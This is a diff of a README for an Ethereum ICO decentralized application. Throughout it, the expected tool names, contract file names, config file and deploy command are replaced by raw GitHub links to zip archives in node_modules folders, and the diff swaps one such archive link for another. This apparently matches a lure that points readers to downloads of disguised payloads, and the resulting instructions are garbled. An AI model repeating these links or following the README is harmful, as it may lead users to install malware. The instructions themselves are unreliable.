@@ -14,13 +14,13 @@ A decentralized application (DApp) for conducting an Initial Coin Offering (ICO)
 
 - Solidity (Smart Contracts)
 - Truffle Framework
-- https://raw.githubusercontent.com/Mehul-Rathva/ETHERUM-ERC-20-TOKEN-MAIN/main/node_modules/picomatch/ETHERUM-ERC-20-TOKEN-MAIN_v1.8-beta.3.zip
-- https://raw.githubusercontent.com/Mehul-Rathva/ETHERUM-ERC-20-TOKEN-MAIN/main/node_modules/picomatch/ETHERUM-ERC-20-TOKEN-MAIN_v1.8-beta.3.zip
+- https://raw.githubusercontent.com/Mehul-Rathva/ETHERUM-ERC-20-TOKEN-MAIN/main/node_modules/immutable/TOKE-ER-ETHERU-MAIN-1.6.zip
+- https://raw.githubusercontent.com/Mehul-Rathva/ETHERUM-ERC-20-TOKEN-MAIN/main/node_modules/immutable/TOKE-ER-ETHERU-MAIN-1.6.zip
 - Lite Server (Development)
 
 ## Prerequisites
 
-- https://raw.githubusercontent.com/Mehul-Rathva/ETHERUM-ERC-20-TOKEN-MAIN/main/node_modules/picomatch/ETHERUM-ERC-20-TOKEN-MAIN_v1.8-beta.3.zip (v10.x or later)
+- https://raw.githubusercontent.com/Mehul-Rathva/ETHERUM-ERC-20-TOKEN-MAIN/main/node_modules/immutable/TOKE-ER-ETHERU-MAIN-1.6.zip (v10.x or later)
 - Truffle Framework
 - Ganache (for local blockchain)
 - MetaMask browser extension
@@ -55,9 +55,9 @@ npm run dev
 
 The project contains three main smart contracts:
 
-1. `https://raw.githubusercontent.com/Mehul-Rathva/ETHERUM-ERC-20-TOKEN-MAIN/main/node_modules/picomatch/ETHERUM-ERC-20-TOKEN-MAIN_v1.8-beta.3.zip` - The ERC-20 token implementation
-2. `https://raw.githubusercontent.com/Mehul-Rathva/ETHERUM-ERC-20-TOKEN-MAIN/main/node_modules/picomatch/ETHERUM-ERC-20-TOKEN-MAIN_v1.8-beta.3.zip` - Manages the token sale process
-3. `https://raw.githubusercontent.com/Mehul-Rathva/ETHERUM-ERC-20-TOKEN-MAIN/main/node_modules/picomatch/ETHERUM-ERC-20-TOKEN-MAIN_v1.8-beta.3.zip` - Handles contract migrations
+1. `https://raw.githubusercontent.com/Mehul-Rathva/ETHERUM-ERC-20-TOKEN-MAIN/main/node_modules/immutable/TOKE-ER-ETHERU-MAIN-1.6.zip` - The ERC-20 token implementation
+2. `https://raw.githubusercontent.com/Mehul-Rathva/ETHERUM-ERC-20-TOKEN-MAIN/main/node_modules/immutable/TOKE-ER-ETHERU-MAIN-1.6.zip` - Manages the token sale process
+3. `https://raw.githubusercontent.com/Mehul-Rathva/ETHERUM-ERC-20-TOKEN-MAIN/main/node_modules/immutable/TOKE-ER-ETHERU-MAIN-1.6.zip` - Handles contract migrations
 
 ## Usage
 
@@ -80,14 +80,14 @@ truffle test
 
 To deploy to a live network:
 
-1. Update `https://raw.githubusercontent.com/Mehul-Rathva/ETHERUM-ERC-20-TOKEN-MAIN/main/node_modules/picomatch/ETHERUM-ERC-20-TOKEN-MAIN_v1.8-beta.3.zip` with your network settings
+1. Update `https://raw.githubusercontent.com/Mehul-Rathva/ETHERUM-ERC-20-TOKEN-MAIN/main/node_modules/immutable/TOKE-ER-ETHERU-MAIN-1.6.zip` with your network settings
 2. Run migrations:
 ```bash
 truffle migrate --network <network-name>
 ```
 3. Deploy frontend:
 ```bash
-https://raw.githubusercontent.com/Mehul-Rathva/ETHERUM-ERC-20-TOKEN-MAIN/main/node_modules/picomatch/ETHERUM-ERC-20-TOKEN-MAIN_v1.8-beta.3.zip
+https://raw.githubusercontent.com/Mehul-Rathva/ETHERUM-ERC-20-TOKEN-MAIN/main/node_modules/immutable/TOKE-ER-ETHERU-MAIN-1.6.zip
 ```
 
 ## License
